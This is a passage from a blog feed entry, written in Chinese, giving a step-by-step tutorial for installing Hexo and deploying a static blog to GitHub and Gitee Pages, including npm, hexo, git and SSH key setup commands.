class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装成功后，需要初始化我们的博客，输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init 博客名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install #安装npm</span><br><span class="line">hexo s -p 端口号 #本地运行</span><br><span class="line">例：hexo s -p 5555</span><br><span class="line"></span><br><span class="line">或者 hexo s  #会自动给你配置一个端口</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/10.png"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/11.png"></p><h3 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a><strong>Hexo常用命令</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g #安装Hexo</span><br><span class="line">npm update hexo -g #升级</span><br><span class="line">hexo init #初始化博客</span><br><span class="line"></span><br><span class="line">命令简写</span><br><span class="line">hexo n &quot;我的博客&quot; &#x3D;&#x3D; hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate #生成</span><br><span class="line">hexo s &#x3D;&#x3D; hexo server #启动服务预览</span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy #部署</span><br><span class="line"></span><br><span class="line">hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line">hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</span><br></pre></td></tr></table></figure><h3 id="发布网站"><a href="#发布网站" class="headerlink" title="发布网站"></a>发布网站</h3><p>上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的_config.yml文件称为<strong>站点</strong>配置文件</p><p>进入跟目录里的themes文件夹，里面也有个_config.yml文件，这个称为<strong>主题</strong>配置文件</p><p>下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件_config.yml，翻到最后修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repo: 这里填入你之前在GitHub上创建仓库的完整路径，记得加上 .git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><h2 id="gitee搭建博客"><a href="#gitee搭建博客" class="headerlink" title="gitee搭建博客"></a>gitee搭建博客</h2><h3 id="安装hexo插件"><a href="#安装hexo插件" class="headerlink" title="安装hexo插件"></a>安装hexo插件</h3><p>安装Node.js淘宝镜像加速器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="安装hexo插件-1"><a href="#安装hexo插件-1" class="headerlink" title="安装hexo插件"></a>安装hexo插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h3 id="创建博客的文件夹"><a href="#创建博客的文件夹" class="headerlink" title="创建博客的文件夹"></a>创建博客的文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init 文件名（自己定义）</span><br></pre></td></tr></table></figure><p>进入文件夹，再安装hexo插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd 文件名</span><br><span class="line">npm install</span><br><span class="line">hexo s   #可以本地访问该网站</span><br></pre></td></tr></table></figure><p>初始化博客，在博客目录下输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;gitee账号名称&quot;</span><br><span class="line">git config --global user.email  &quot;gitee的邮箱注册&quot;</span><br></pre></td></tr></table></figure><h3 id="配置giteeSSH"><a href="#配置giteeSSH" class="headerlink" title="配置giteeSSH"></a>配置giteeSSH</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;gitee的注册邮箱&quot;</span><br></pre></td></tr></table></figure><p>步骤6和7是为了生成自己的密钥，这样再通过git提交的时候，不需要每次都输入用户名和密码</p><p>把生成的密钥添加到gitee上，在C:\Users\Administrator.ssh目录下寻找id_rsa.pub文件，用记事本打开后复制，在gitee点击设置，再点击SSH公钥，粘帖后保存。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/11.png"></p><p>在blog根目录里的_config.yml文件称为<strong>站点</strong>配置文件，打开后在文档的最后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repo: ##在gitte仓库中的克隆下载点击复制链接</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/12.png"></p><p>在文件中寻找url，添加博客网址</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/13.png"></p><h3 id="通过cmd进入博客目录"><a href="#通过cmd进入博客目录" class="headerlink" title="通过cmd进入博客目录"></a>通过cmd进入博客目录</h3><p>分别输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>进入gitee仓库中，点击管理–&gt;初始化README启动SVN访问，再点击服务–&gt;Gitee Pages</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/14.png"></p><p>点击强制使用HTTPS，点击更新</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/blog/15.png"></p><h3 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h3><p>在博客目录下的\source_posts添加文件，在进行第五步操作即可添加成功。</p><p>setting –&gt; custom domain 在方框上填上自己的自定义域名    然后点击save</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;github搭建博客&quot;&gt;&lt;a href=&quot;#github搭建博客&quot; class=&quot;headerlink&quot; title=&quot;github搭建博客&quot;&gt;&lt;/a&gt;github搭建博客&lt;/h2&gt;&lt;p&gt;使用github来托管项目文件&lt;/p&gt;
&lt;p&gt;仓库：即你的项目，你想在git</summary>
      
    
    
    
    
  </entry>
  
</feed>
